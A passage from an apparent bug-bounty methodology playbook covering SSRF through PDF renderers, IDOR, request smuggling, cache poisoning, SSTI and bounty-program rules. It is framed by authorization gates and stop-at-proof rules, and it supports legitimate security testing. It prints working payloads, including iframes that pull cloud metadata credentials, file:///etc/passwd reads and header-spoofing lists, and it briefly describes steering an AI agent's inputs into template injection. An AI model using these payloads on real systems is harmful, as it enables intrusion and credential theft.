**Provenance:** Hacktron AI's OpenAI/Discourse chain (Harsh Jaiswal/rootxharsh, Mohan Pedhapati/s1r1us, Rahul Maini/iamnoooob; original writeup hacktron.ai/blog/hacking-openai dated 2026-09-13; CVE-2026-32882). **Verification gaps:** no token-level detail published (no aud/scope values, no endpoints); NVD returned a JS-gated landing page for the CVE and GitHub Advisory search returned no results — the CVE ID is corroborated solely via the Discourse advisory (GHSA-vhm9-85gw-x335, CVSS 3.1 8.8, published by davidtaylorhq); the internal PR and repo are unverifiable by design.

### Expanded method

1. **Enumerate every app behind the shared identity provider** and rank surfaces by trust — the core finding came from mapping service boundaries, not endpoint fuzzing.
2. **Mint a session on the least-trusted surface** (the forum in the reference case) and export its cookie/JWT verbatim; decode offline: `jq -R 'split(".") | .[1] | @base64d'` or jwt.io — the claim values you inspect are your own observations.
3. **Replay that exact token against each higher-trust sibling** (fresh browser profile, or `curl -H 'Cookie: <forum-token>' https://<sibling-app>/`), then hit an authenticated endpoint. RFC 9700 §2.3 makes it a MUST for resource servers to refuse tokens whose audience doesn't match — acceptance of a low-trust-surface token by a high-trust surface is the finding; cite the RFC in triage.
4. **Audit upload validation for decoder fall-through:** the reference stack used FastImage (does not parse HEIF/AVIF), so `.heic` uploads skipped it and went straight to ImageMagick's `magick`, exposing libheif to attacker-controlled bytes. Check every app that accepts image formats its primary validator cannot decode.
5. **Hunt silent upstream fixes:** find bug-fix commits in decoder libraries never tagged as security fixes and without a CVE, then verify the distro package lacks them — `git log` the upstream library; `apt-cache policy libheif` on the app's actual container base (reference case: Debian 12 shipped vulnerable libheif 1.19.7; Debian's fix landed Aug 8, 2026; Debian 13 still shipped 1.19.8 at report time). "Patched upstream" is not "patched in deployment".
6. **Memory-corruption validation [G3, own instance only]:** trigger and validate against your own instance of the same software, never the target (reference team validated on their own Discourse Cloud instance first, then the real forum — validation on the real target was disclosed honestly and did not block the payout; testing outside scope must be disclosed, not hidden).
7. **Prove cross-service impact with one reversible action** (reference: one benign README-renaming PR from a hijacked employee session), then stop.

**Tooling:** token decode (`jq`/jwt.io); curl replay; Discourse remediation reference (`git pull` + `./launcher rebuild app`; ImageMagick `security policy.xml` format restriction; upstream libheif v1.23.4 cited as the security release). Program plumbing: OpenAI on Bugcrowd, Discourse on HackerOne.

**FP-rule refinement:** a token accepted by a sibling app is a finding only with the authenticated endpoint succeeding — record the endpoint and the response. Anchor lessons: the payable bug was identity architecture, not memory corruption ($6,500 explicitly for the OpenAI-side SSO finding; testing the Discourse-hosted forum was excluded from bounty scope); validation coverage gaps redirect attack surface to the strongest parser available.

## PB-9 — SSRF through HTML-to-PDF export pipelines

**Provenance:** HackerOne report #2262382 — "Server Side Request Forgery (SSRF) via Analytics Reports"; reporter megaman_ (signed @Mega7); $25,000 formatted bounty; final rating Critical 10.0 (author_type Team); full CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/CR:H/IR:H/AR:H. **Fact-check boundaries:** the public disclosure redacts the endpoint and PoC (███ blocks); the "severity history 8.8 → 9.8 → 10.0" is NOT verifiable from the public disclosure (only the final rating shows); the reporter's conclusion states "Unauthorized Access to AWS Credentials" (the AccessKeyId/SecretAccessKey phrasing is a paraphrase); the 169.254.169.254 payload below is the prior-art AppSecCo technique — an inference for this target, not disclosed text. Verified verbatim: the team summary that `element[:template]` was unsanitized in an error message and `html_without_layout` was "fed into a library that converts this into a PDF"; the fix diff (`- "Missing template for element: #{element[:template]}"` → `+ "Missing template for element"`); the one-word Impact section "SSRF."; the vendor's "stopping at the right point in testing".

### Expanded method

1. **Map export endpoints:** analytics reports, invoices, dashboards, ID cards — anywhere user-controllable fields flow into rendered HTML for server-side conversion.
2. **Benign-markup survival probe:** inject a stray `</iframe>`; "generating the PDF caused the iframe to be rendered in the downloaded PDF as well" proves server-side rendering.
3. **Error-path reflection:** deliberately trigger error conditions — the only vector in the reference case was `"Missing template for element: #{element[:template]}"` interpolating the user value into `html_without_layout` fed to the PDF library. Audit every interpolation landing in rendered HTML, especially exception paths nobody sanitizes.
4. **Confirm blind SSRF first:** point the injected markup at an out-of-band listener (Burp Collaborator/OAST); a DNS+HTTP callback from the app server's IP distinguishes server-side rendering from client behavior. Keep the listener within the permitted controlled endpoints.
5. **Internal pivoting [G3]:** the AppSecCo two-step — `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>` lists role names, then the role-specific path renders credential JSON into the PDF. Requires the G3 gate (internal-network reachability — `../../safety-gates`); per-cloud header requirements decide what can work (see PB-2 probes; Azure headerless fallback `/metadata/v1/instanceinfo`; ECS creds at `http://169.254.170.2/v2/credentials/<GUID>`; IPv6 alias `http://[fd00:ec2::254]` bypasses IPv4-only filters).
6. **Credential validation:** present redacted evidence and request owner-side validation — the safety gates (`../../safety-gates`) prohibit using discovered production credentials to obtain deeper access; `aws sts get-caller-identity` / enumerate-iam (github.com/andresriancho/enumerate-iam) runs only in lab or owner-approved settings.
7. **Engine pivot payloads when `<iframe>` is filtered:** headless Chromium accepts `<embed src>`, `<input type="image" src>`, `<video src>`, `<audio src>`, `<svg src>`, `<base href>`, `<meta http-equiv="refresh" content="0; url=...">`, or JS `fetch('http://127.0.0.1').then(async r=>document.write(await r.text()))`; wkhtmltopdf yields local file read via `<iframe src="file:///etc/passwd">` unless `--disable-local-file-access` is set; `file:///proc/self/environ` leaks `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` (ECS).
8. **URL→PDF SaaS APIs** (`POST {"url": "..."}`): the `url` parameter fetches any target server-side — supply an OAST listener first, then the metadata endpoint; the fetch is blind unless rendering errors are returned.
9. **Renderer fingerprinting:** grep received PDFs' metadata for vendor strings — "Skia/PDF m65" = headless Chrome v65 (JS executes; fetch/XHR available) vs wkhtmltopdf/WeasyPrint (no JS, but `file://` iframes and CSS `url()` fetches still fire).

**FP-rule refinement:** a legitimate URL preview fetching an allowed public destination is not automatically SSRF (existing) — and HTML surviving into a PDF is not SSRF until the fetch crosses the documented destination policy; establish the violation with the OAST signal plus the denied-destination fetch.

**Anchor lessons:** a one-word impact section plus a tight PoC still earned $25,000 — Critical came from demonstrated unauthorized access to AWS credentials, not prose; IMDSv2 is the decisive hardening (a plain iframe GET returns nothing when a PUT token is required — remediating only the HTML injection leaves the renderer's fetch capability armed); stop at proof ("stopping at the right point in testing").

## PB-10 — Smart-contract and DeFi program scoping

**Provenance:** [Metric] Immunefi Metric/MetricXYZ OMM DEX program ($500k max, Primacy of Impact); [Safe] SafeFoundation bug bounty. On-chain contract review itself is out of scope for this playbook; it covers program scoping and PoC discipline.

### Metric OMM DEX specifics (custom-pricing bin pools)

- **Oracle trust boundary (the program's named Critical, $50,000 floor):** try to make an oracle accept a price update without a valid Pyth or Chainlink signature, or a compressed-feed push from an unauthorized pusher. Audit `contracts/oracles/providers/{PythOracle,ChainlinkOracle}.sol`, `oracles/compressed/CompressedOracle.sol`, `oracles/utils/LazerConsumer.sol` in Metricxyz/oracle-contracts — local forks only.
- **Mispricing (High):** a swap on an anchored-price provider pool executing outside the band or beyond its configured staleness limit; review AnchoredPriceProvider.sol band/staleness wiring and validate SwapMath.sol step math against docs/SwapMath.md (in-bin pricing, specified-in/out, fee sizing, balance limits).
- **Fee-cap/timelock bypass (High):** trace admin fee caps and the price-provider timelock through MetricOmmPoolFactory.sol; only bypassing the caps or an honestly configured timelock is in scope, and only at Medium+.
- **Unauthorized role use (High):** enumerate paths reachable without factory owner, oracle ADMIN_ROLE (blacklist, integrators, approved factories, registration fee, withdrawEth), or propAMM adapter admin rights, via auth/Auth.sol and auth/Auth2Step.sol.
- **Storage alignment:** LiquidityLib.sol is DELEGATECALL'd into the pool, and PoolStateLibrary/Slot0Library readers must match MetricOmmPool storage packing (packedSlot0Initial/packedSlot0Final on swap extension-point functions). Diff slot layouts for drift — EXTSLOAD readers read raw slots.
- **Extension hooks:** pools can run up to seven ordered IMetricOmmExtensions with a deployment-fixed call order; unimplemented BaseMetricExtension hooks revert. Test OracleValueStopLossExtension (per-bin value vs decaying high-watermark drawdown, timelocked params, cancels immediate) and PriceVelocityGuardExtension (revert bound scaled by sqrt(1 + blockDiff), first swap seeds the anchor, admin setters immediate).
- **Router settlement:** MetricOmmSimpleRouter settles core swaps via callbacks with transient context; ExternalSwapExecutor does external-venue swaps with verified refunds; users approve the router, never the executor. Probe refund/recipient accounting in multihop Sequence paths and MetricOmmPoolLiquidityAdder's callback token pulls.
- **Severity sizing:** Critical requires ≥ $10,000 of funds directly at risk, else assessed High at most; reward = 20% of funds directly affected, $50,000 floor / $500,000 cap (permanent-freezing Critical capped at $200,000); High/Medium also 20% of funds affected capped/floored at tier bounds; High yield/royalty theft uses 100% of funds at risk; temporary-freezing rewards double from the full frozen value per additional 24 h frozen up to the High cap (measure freeze duration precisely); upgradeable/pausable repeatable-attack scenarios count only the initial attack at full value, 50% reduction per subsequent 24 h window.
- **Pre-submit checks:** attacker-created pool/extension/price provider downgrades one severity; MEV within slippage/deadline out of scope; stale-feed halts (FeedStalled/staleness/deviation checks) are intended behaviour; third-party providers out of scope; rounding dust below 0.01% and $10 out unless repeatable to Medium+; 'Fix pending' list (MetricOmmPoolLiquidityAdder, SwapMath, ScheduledMultiplier, multiplier-token pricing on BNB Chain) marks the hottest no-go zones. Start in the program's named Custom Critical target space (oracle-contracts) rather than hunting generic theft first.

### Safe reporting criteria

- **Route first:** contract issues → bounty@safefoundation.org; severe Safe{Wallet} (web/mobile/backend) → wallet-reports@safe.global; non-security wallet bugs → GitHub issue. The program "applies only to smart contract-related vulnerabilities" — a web/API finding sent to the contract bounty is auto-out-of-scope.
- **Scope gate:** only page-listed contracts (core Safe v1.4.1/v1.5.0, legacy Gnosis Safe v1.1.1–v1.3.0, listed modules, Safenet Beta Staking); resolve deployed addresses via github.com/safe-global/safe-deployments.
- **Impact gate:** a finding must map to one of the page's four in-scope examples to be payable — theft of funds/tokens; freezing or permanently locking funds; replay attacks on the same chain; changing Safe or module settings without owner consent.
- **Duplicate/exclusion gate:** contracts/modules/libraries not listed; gas optimizations; known issues in audits or documentation; issues already fixed in newer versions; non-standard features on non-Mainnet EVM chains; screen against /security/audits and /security/past-bounties — "Issues already known to the Safe team or previously reported are not eligible".
- **Intended-behavior evidence:** pull the README/CHANGELOG before claiming impact — the $50k Medium tier hinges on "fund loss due to unexpected or unintuitive behavior" that "users cannot reasonably anticipate"; cite the exact intended behavior you deviate from.
- **Report format:** email with (a) detailed description, (b) steps to reproduce, (c) an Ethereum Mainnet address for payment; paid in USDC on Mainnet; anonymous submissions welcome.
- **Severity calibration from paid bounties:** Allowance Module nonce-overflow transfer replay $30,000 (Medium); Safe-set-as-owner threshold-1 bypass $5,000 (Medium); duplicate-owners setup() lockup $2,500 (Medium); getModulesPaginated drops the 'next' module $2,000 (Low); MultiSend self-destruct (UX-only) $1,000 (Low); ERC-4337 signature-padding gas grief $1,000 (Low) — pay on impact taxonomy, not bug class (30× difference between fund loss and degraded experience).
- **Safe harbor:** allow reasonable time before public disclosure; avoid privacy violations or service disruption; do not exploit in production — then no legal action; but "Public disclosure or intent to exploit a vulnerability on Mainnet will make a report ineligible". "When in doubt, the Ethereum Foundation Bug Bounty rules apply" — which require a PoC ("Issues without a POC ... are not eligible") and that testing "must take place on local running testnets". Severity caps: High ≤ $1M, Medium ≤ $50k, Low ≤ $10k.
- **Not-found note (no-fabrication standard):** the "gate-question list" sometimes attributed to this program ("downgrade, not drop", "rejection is not the end") does NOT exist in the source — not on the live page, not in any Wayback revision, not publicly searchable. It is reported as absent rather than fabricated; the actual gate is the program's eligibility rules, exclusion list, and disclosure policy above.

### Method

1. Three-tab intake (/information/, /scope/, /resources/); clone in-scope repos recursively; build (Foundry; reference versions Foundry 1.7.1 + solc 0.8.35). Program pages may publish no contract addresses — the repos are the targets.
2. Read the exclusion list FIRST: known-issues repo + all audit reports + contest findings ("known economic behaviour" clauses).
3. Map impact families to concrete contracts.
4. Fork mainnet locally; runnable Foundry PoCs for every candidate (`forge test --match-path ...`) — required for all severities.
5. Severity-size per the program matrix; submit via the program plumbing (Immunefi dashboard selecting Primacy of Impact; Safe email format).

### Submission economics

- **Fork-PoC standard:** the runnable Foundry/Hardhat mainnet-fork PoC is the mandatory artifact — pinned block number, the exploit executed end-to-end against the fork, and an explicit profit/funds-at-risk assertion on the attacker's balance delta; submit the test inline or as a gist — triage will not clone and build your repo.
- **Fee/stake reality:** Immunefi charges ~$25 per report payable in Immunefi Credits; Cantina takes $5–$100 submission deposits; Sherlock requires a $250 USDC stake per submission, slashed on invalid reports — observed hit rates put valid submissions near 52%, so price the stake into per-report EV.
- **KYC:** 87 of 154 catalogued programs require identity verification before payout — factor disclosure into program selection before testing, not at invoice time.
- **Reward formula:** the dominant matrix is reward = 10% of funds directly at risk, capped at the program maximum and floored at the program minimum (Metric's 20%-of-affected shape above is the exception, not the rule) — estimate funds-at-risk when choosing the target, not after writing.

## PB-11 — Program-rules extraction and report quality

**Provenance:** Google Cloud VRP rules + report-quality playbook (rules body, PoC article, and tier list all verified via the SPA's content API in the research pass).

### Extracting JS-gated program rules

- The rules page is a client-rendered SPA; WebFetch and JS-rendering readers may return only the shell. Working pattern: `curl -s -H "Referer: https://bughunters.google.com/" "https://bughunters.google.com/rest/v1/articles/about/rules/google-friends/cloud-vulnerability-reward-program-rules"` → JSON {title, body(markdown), documentId, public}. The same `/rest/v1/articles/<path-after-domain>` pattern fetches linked articles; `.../rest/v1/content/pages?language=en` returns the page index.
- SPA-bundle route recovery: grep the minified bundle for API hosts/paths (reference: `bughunters-pa.clients6.google.com` + Angular route configs). Wayback does not help for this SPA (snapshot is the same JS-only shell).

### Cloud VRP classification & proof

- **Classify before writing:** reward table spans full owner-equivalent project takeover at the top through multi-service write/read, single-service variants, prior-access variants, and design/metadata findings; reward-step ladder $101,010 → $75,000 → $50,000 → $31,337 → $25,000 → $20,000 → $15,000 → $13,337 → $10,000 → $7,500 → $5,000 → $3,133.70 → $1,337 → $500 → $200 → $100.
- **Impact Tier follows the ROOT-CAUSE component, not the discovery surface:** a flaw found in an IT1 product whose root cause is an IT3 component is assessed at IT3; deprecating products and Google-maintained OSS cap at IT3b. Tier list: github.com/google/bughunters/blob/main/cloud_tiers/cloud-tiers.asciipb (208 products verified).
- **Root-in-Cloud ($250,000), Path A:** for IAM/token-minting logic flaws, prove unauthorized control of `cloud-vrp@butterfly-net.iam.gserviceaccount.com` (project `butterfly-net`) with ZERO preconditions (no pre-existing permissions, no provisioned products, no non-default config, no victim interaction) via one of: POST `https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/cloud-vrp@butterfly-net.iam.gserviceaccount.com:signBlob` with `{"payload": "TmljZSBjYXRjaCE="}` (base64 of "Nice catch!"), `:signJwt` with `{"payload": "{\"aud\":\"cloud-vrp\",\"msg\":\"Nice catch!\"}"}`, or `:generateAccessToken` with `{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}`.
- **Infrastructure RCE — the Borg hard stop:** the moment a payload/SSRF/RPC yields code execution inside Borg, stop all testing — no lateral movement, no internal discovery, no credential harvesting, no Spanner/Chubby access. Safe Harbor pays on the compromised job's own privileges/reachability; unrelated internal chaining does not count toward Root-in-Cloud.
- **Never touch customer space:** exclude `*.bc.googleusercontent.com` and `*.appspot.com`; never scan CIDRs from https://www.gstatic.com/ipranges/cloud.json (a Google asset found inside a customer block during a broad scan still counts as unauthorized). Test sandbox/isolation escapes locally (sole-tenant nodes, root shell on your own GKE node, upstream gVisor); if it can't be tested safely, submit technical analysis + local repro instead of live multi-tenant testing.
- **Exceptional automated PoC spec:** minimal and self-contained (Python requests preferred; HTML/Bash/Go/Node OK), runnable in Debian/Cloud Shell, reads credentials from an easily-swapped variable ("LOGIN_TOKEN") because the panel always uses its own accounts, prints the unauthorized-data response; explicitly NO Selenium/browser automation — for DOM-XSS-style triggers skip automation and explain why; an unlisted YouTube video of the PoC run earns extra credit.
- **The seven scored dimensions** (freeze at triage): vulnerability description; attack preconditions; succinct product-specific impact analysis; complete reproduction steps; full target info (product/version/hostnames); reproduction output (fuzzer/debugger/HTTP responses); <3-workday responsiveness. Only information available BEFORE triage is considered.
- **Quality matrix:** Low 0.8x / Good 1x / Exceptional 1.2x (capped at $5,000). "No PoC" is an explicit non-qualifying category; "Theoretical or speculative impact" lands Low.
- **Downgrade ladder:** prior access, victim interaction, exploitability, uncommon configuration, and high-entropy IDs each step the amount down one rung (e.g., $5,000 → $3,133.70); footnote [3] explicitly rejects S1a claims whose PoC pre-provisions a roles/owner binding — design the proof to eliminate preconditions and high-entropy-ID dependencies before writing.
- **Plumbing:** report at bughunters.google.com/report/vrp (select 'Cloud VRP'); PGP key for sensitive details: https://services.google.com/corporate/publickey.txt.

## PB-12 — Cross-protocol IDOR/BOLA object-diffing

**When it applies:** any application with per-user objects addressable by identifier — REST path/query/body params or GraphQL node lookups — on a program that issues or permits two test accounts. PB-1's access-control step is GraphQL-scoped; this playbook generalizes the two-account diff to every object-bearing protocol surface uniformly. **Priority-tier:** BOLA/IDOR is the deterministic class with the highest payout-per-effort in H1 2025 platform data — run it before speculative techniques.

**Provenance:** method-standard (PortSwigger access-control labs, OWASP API1:2023 Broken Object Level Authorization); no single disclosure — the two-account replay diff is the canonical BOLA test. The payout-per-effort ranking reflects platform payout distributions for BOLA-class reports in H1 2025 data; treat it as a prioritization heuristic, not a per-program guarantee.

### Expanded method

1. **Enumerate object-bearing endpoints:** path params (`/users/{id}`, `/invoices/{id}`), query params (`?doc_id=`), JSON body fields (`{"accountId": ...}`), GraphQL `node(id:)` and Relay global IDs, batch endpoints (`/batch?ids=`, GraphQL aliases and JSON-array batching per PB-1). Grep JS bundles for ID-bearing routes not linked in the UI.
2. **Create canary objects as account A [G2]:** uniquely marked synthetic objects per the Stage-2 identity prep and `../../evidence` — the canary marks prove which side of the boundary a response came from.
3. **Replay as account B with A's identifiers [G2]:** identical method, path, and body; only B's session token changes. Every enumerated endpoint gets the pair — absence of a 403 is signal, not noise.
4. **Diff the response pairs:** status (200 vs 403/404), body-field set (partial-field leaks count — a 200 that redacts `ssn` but returns `email`/`dob` is the finding), and side channels (Content-Length deltas, timing, existence oracles where the 403-vs-404 mapping differs by authorization state). Read B's response as a decision table: **200 + A's data** = confirmed IDOR; **200 + B's own data** = the server ignored the supplied identifier — hunt the second identifier it actually keyed on; **403** = object-level enforcement present; **404** = possibly a masked denial — verify the object exists as A; **200-empty/null** = soft-fail — probe sibling fields and async side-effects; **500** = the ID was parsed downstream — worth encoding/type probes.
5. **Escalate to write ops [G2]:** PATCH/PUT/DELETE against A's canary under B's session; verify committed state by re-reading as A — a 200 response is not proof of a committed write (existing FP rule).
6. **Test indirect references:** hashed/encoded IDs (base64, HMAC'd, sequential-looking hashes — decode before assuming unguessability), UUIDs leaked in sibling responses, nested objects (`/teams/{t}/members/{m}`), IDOR-through-graph (objects reachable only as nested fields of an authorized parent), and batch/alias sweeps. Relay-style global IDs are base64(`TypeName:123`) — decode, increment the numeric component, re-encode. Alias/batch envelopes multiply sweep throughput — up to ~200 objects per request inside a single authorized envelope (PB-1's alias shape), so one request budget tests an ID range.
7. **Second-identifier and header swap [G2]:** many stacks enforce on the path identifier while trusting a body or header identifier — replay with A's path but B's `account_id`/`org_id`/`tenant_id` body field, and the inverse (B's path, A's body field). Cross-tenant headers are the same class: inject or swap `X-User-Id`, `X-Account-Id`, `X-Forwarded-User`, `X-UID` and check whether the backend honors them over the session principal. Nested-path re-check bypass: where the parent segment is authorized, request the deeper path directly (`/teams/{t}/members/{m}/settings`) — the object check is often wired at the parent controller only.
8. **Cross-protocol parity pass:** the same object reachable via REST and GraphQL frequently carries authorization on one path only — re-run the A/B diff on every equivalent resolver and route; include versioned endpoints (`/v1/` vs `/v2/`) and mobile/legacy routes.
9. **Stop at proof:** one demonstrated cross-account read, plus one committed write where escalation is authorized, per object class — then record the class and move on. Sweeping every ID is evidence-volume, not evidence-quality.

**Tooling:** Burp Repeater with two session profiles (Auth Analyzer / Autorize-style extensions automate the A/B replay matrix), curl + diff for scripted pairs, Turbo Intruder for identifier sweeps within the authorized request budget, base64/jwt decoders for indirect refs.

**Evidence bar:** paired request/response captures (A-authorized vs B-attempted) with canary identifiers visible; committed-state proof for any write finding; the enumeration table showing which endpoint classes were diffed. Store per `../../evidence`.

**FP-rule refinement:** a 403-vs-404 existence oracle or an ID merely appearing in a response is not BOLA — the cross-account object render is. A 200 returning only fields the owner already publishes is not a finding. Conversely, some stacks return 404 instead of 403 by design — prove the object exists as A before recording B's response as a denial. The recurring kill-list: a CDN-cached 200 (the render was served from a shared cache, not authorized fresh — re-request with a cache-buster and compare); public-by-design fields (the endpoint publishes the field to anonymous traffic anyway); self-IDOR (B read B's own objects — the IDs were session-scoped, never swapped); 404-masking (denial dressed as not-found — the existence-as-A check above); sequential-ID-over-public-data (a guessable ID reaching data the app intentionally exposes). UUID-keyed IDOR remains valid wherever the UUID is obtainable — leaked in sibling responses, share links, list endpoints, referrers — the defense was unguessability, and it failed.

## PB-13 — Front-end/backend trust boundary: request smuggling and cache poisoning

**When it applies:** targets behind a front-end tier (CDN, reverse proxy, LB doing TLS termination) that can disagree with the backend about request boundaries or cache keys. Shares PB-4's HTTP/2 tooling (`RequestEngine`, single-packet gating, connection warming) — PB-4 races request timing; this playbook exploits request *framing* and keying.

**Provenance:** PortSwigger desync material (James Kettle's CL.TE/TE.CL and HTTP/2-desync research) plus the same group's cache-poisoning and web-cache-deception research; the Next.js middleware-bypass class from the published CVE-2025-29927 (`x-middleware-subrequest`) disclosure; the 2025–26 desync refresh (0.CL, early-response gadgets, parser-discrepancy primitives, client-side desync). Kettle's published scale data for the class: ~700 confirmed vulnerabilities and roughly $200,000–350,000 in bounties across the research program. All detection below is limited to own-request probes; anything that can touch other users' queues or shared cache entries is gated accordingly.

### Expanded method — desync

1. **Baseline the front-end pairing [G2]:** identify the proxy chain and each hop's HTTP version — the exploitable surface is a parsing disagreement (H2 front → H1.1 back is the classic shape).
2. **CL.TE / TE.CL probes [G2, own requests only]:** standard dual-length probes where a smuggled prefix lands inside *your own* follow-up request; detect via timeout deltas (the TE.CL partial-request hang) and response desync. Never leave a dangling smuggled prefix that could splice into another user's request.
3. **HTTP/2 downgrade paths [G3]:** H2.CL/H2.TE where the front-end honors pseudo-header lengths but translates to Content-Length downstream; header-injection smuggling where `\r\n` inside H2 header values reaches the H1 backend verbatim.
4. **Deterministic delivery:** Turbo Intruder `Engine.BURP2` as in PB-4 — queue probe and follow-up through one warmed connection so the smuggled sequence lands deterministically; connection-warm first to pin the backend route.
5. **Response-queue proof [G3, own requests only]:** demonstrate desync by shifting a response boundary — your follow-up request receives the response to your smuggled request. Only ever splice requests you sent; poisoning a queue shared with real users is outside the gates (`../../safety-gates`) regardless of program text.
6. **0.CL and early-response gadgets [G2, own requests only]:** the 0.CL shape — the front-end honors `Content-Length: 0` and forwards a body the backend then parses as the next request's prefix; pair with early-response gadgets (endpoints that respond before the body arrives — redirects, early rejects) to strand the body as a desync primitive.
7. **Parser-discrepancy probing beyond CL/TE [G2]:** probe header-value (H-V) and header-terminator (H-T) primitives, not only CL/TE disagreement — duplicate Content-Length headers with agreeing vs disagreeing values, whitespace/colon anomalies in header names, obfuscated TE codings. Known trigger shapes: dual-CL requests, multipart/form-data boundary plus `Range:`/byteranges interactions, `Transfer-Encoding: gzip` codings, HTTP/1.0 requests carrying a TE header, and DELETE requests bearing `Content-Location` — each splits parser pairs that disagree on which field governs the body.
8. **Dangling-byte request-queue poisoning [G3, own connection pairs only]:** a leftover byte or truncated prefix from the front-end's read that prefixes the next request on the reused connection — demonstrate only between two requests you sent on one warmed connection.
9. **Shared-Parser Confusion [G2]:** front and back often run the same parser library — discrepancies come from version/config drift between hops, not different parsers; diff parser versions and feature flags across the chain before assuming the surface is homogeneous.
10. **Client-side desync [G3]:** the smuggled response poisons the victim's own fetch pipeline rather than the server's queue — demonstrate against your own assets/session only; the browser-side variant converts a server-side "unexploitable" finding into a proven primitive.

### Expanded method — cache poisoning and deception

11. **Unkeyed-input probing [G2]:** Param Miner or manual header/param sweeps — `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Original-Host`, query params outside the cache key. Detection primitive: reflect an owned marker (your own OAST host) into a response field, then check whether it is served back from cache on a cache-buster-free re-request.
12. **Isolate every key you poison:** carry a unique cache-buster param so the poisoned variant is keyed to your test path — never push an attacker-controlled value into a key serving real users (standing rule: demonstrate the minimal consequence, then stop).
13. **Web cache deception:** path-extension confusion — `/account/settings/anything.css` or `..%2f` traversal-suffix shapes where the CDN caches by extension while the origin ignores the suffix and returns the authenticated page; confirm the entry is served logged-out.
14. **Framework-specific keys:** Next.js middleware (the `x-middleware-subrequest` bypass shape, CVE-2025-29927) and internal route/RSC caches — test whether middleware-enforced controls (auth, redirects, CSP headers) are skipped when an internal or edge cache serves the page.
15. **Cache-entanglement [G2]:** keyed components normalized differently between cache and origin — percent-encoding, case, parameter ordering — let one URL mint a poisoned entry under the cache's normalized key while the origin routes on the raw form. Akamai leaks its computed cache key via the `Pragma: akamai-x-get-*` debug header family (`akamai-x-get-true-cache-key`, `akamai-x-get-request-id`) — compare the leaked key against the URL sent to identify which components are keyed.

**Evidence bar:** the full probe/follow-up request pair plus observed response order and timing deltas for desync; for cache findings, the poisoned response served *from cache* on an unkeyed re-request with age/cache headers visible. Queue evidence uses only your own request pairs — per `../../evidence`. The mandatory cache-poisoning proof shape is **persisted_on_clean**: after poisoning, re-fetch from a clean cache state (fresh cache-buster-free request, ideally a second client or edge vantage) and capture the poisoned entry still being served — an entry seen once is not proof of a persisted poisoned key.

**FP-rule refinement:** a reflected `X-Forwarded-Host` value is not poisoning until a cached variant serves it to a subsequent requester; a single TE.CL timeout is weak evidence — corroborate with a second probe shape or the response-boundary shift before claiming desync. Cache-key behavior differs per CDN: verify the entry was shared-keyed, not private or bypassed.

## PB-14 — SSTI and the server-side injection family

**When it applies:** any user-controlled string rendered through a server-side template engine — form fields, headers, uploaded filenames and content, JSON values, error interpolations — plus the AI-adjacent surface where model output is concatenated into template context (agent report generators, PDF builders, email composers; the PB-2 sink match "renders a template → SSTI").

**Provenance:** PortSwigger SSTI material and the standard engine-identification matrix (Jinja2/Twig/FreeMarker/Mako/Velocity/Thymeleaf decision tree); OAST-based blind-variant detection. Payload syntax below is detection-level — post-identification escalation chains are gate-bound.

### Expanded method

1. **Polyglot detection on every reflected input [G2]:** `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>` — sweep params, headers (`User-Agent`, `Referer`, `X-Forwarded-*`), uploads (filenames, metadata, document fields), JSON body fields, and deferred render surfaces (email templates, PDF exports — pair with PB-9's rendering map). A rendered `49` is the signal.
2. **Error-oracle confirmation [G2]:** inject malformed syntax (`{{`) and compare the error surface — verbose template exceptions fingerprint the engine directly; a swallowed error that still evaluates valid syntax is itself diagnostic.
3. **Time-oracle confirmation [G2]:** where output is not reflected, use engine-appropriate delay payloads; the delay firing is the oracle.
4. **Identify the engine before escalating:** the `{{7*'7'}}` discriminator — `7777777` (string repeat) for Jinja2/Twig-style semantics vs `49`; then the decision tree: FreeMarker `${}` + `<#assign>`, Velocity `#set`/`$class.inspect`, Thymeleaf `*{...}`/`${T(...)}`, Mako `${}` with `<%! %>` blocks. Record the engine and version markers — payload chains are engine-specific, and sending Jinja2 payloads at a Twig engine wastes budget and misreports the class.
5. **Blind variants via OAST [G2]:** engine-appropriate expressions that trigger an outbound DNS/HTTP fetch to your own listener; the Collaborator callback is the impact artifact where nothing renders.
6. **Escalation only after engine confirmation [G3]:** targeted object-graph traversal toward execution — capped at the minimal consequence artifact (read a canary file you planted, render a marker string); never exfiltrate real secrets or pivot (`../../safety-gates`).
7. **AI-adjacent sweep:** where an agent toolchain renders model-influenced content (report generators, invoice/PDF builders, email composers — the PB-2 capability map), the input surface is whatever steers the model: retrieved docs, job files, tool outputs. Test whether model tokens land in template context as source rather than as escaped text — the confused-deputy variant needs no direct field.
8. **Stop at proof:** evaluated arithmetic plus the engine fingerprint, plus one canary read where authorized, is the complete chain — do not enumerate the object graph beyond the first confinement break.

**Tooling:** Burp polyglot sweeps + Param Miner for header surfaces, an OAST listener for blind variants, the engine decision tree for payload selection, tplmap for confirmation runs (its automated execution paths belong at G3/lab, not production sweeps).

**Evidence bar:** raw input string and evaluated output side-by-side (the `49`, not the reflected `{{7*7}}`), the discriminator result and engine fingerprint, OAST captures for blind variants, canary-read output for any execution claim — stored per `../../evidence`.

**FP-rule refinement:** literal reflection of `{{7*7}}` is no finding — the engine must evaluate it. A `49` produced client-side (JS template literals, Angular scope expressions) is front-end injection, not SSTI: verify evaluation is server-side by submitting through a non-browser client or checking whether the value persists rendered in a server-generated artifact. Sandbox-restricted evaluation (arithmetic works, object traversal blocked) is still reportable SSTI — report the demonstrated evaluation and the confinement boundary honestly.

## PB-15 — SSRF internal-network fingerprinting and escalation

**When it applies:** any confirmed server-side fetch (PB-9's rendering channels, webhook testers, URL previewers, import-from-URL, avatar fetchers) where the stock payloads — cloud metadata IPs, localhost — return nothing useful. A failed metadata fetch does not mean the SSRF is weak; it usually means the internal architecture is not standard cloud.

**Provenance:** 2026 disclosed case ($8k) — blind SSRF escalated to full Kubernetes infrastructure exposure by reading leaked response headers; inesmartins k8s-SSRF methodology; H1-2262382 (the $25k PDF-renderer case, PB-9). Detection below is own-request probes only; internal-network actions stop at read-level proof.

### Expanded method

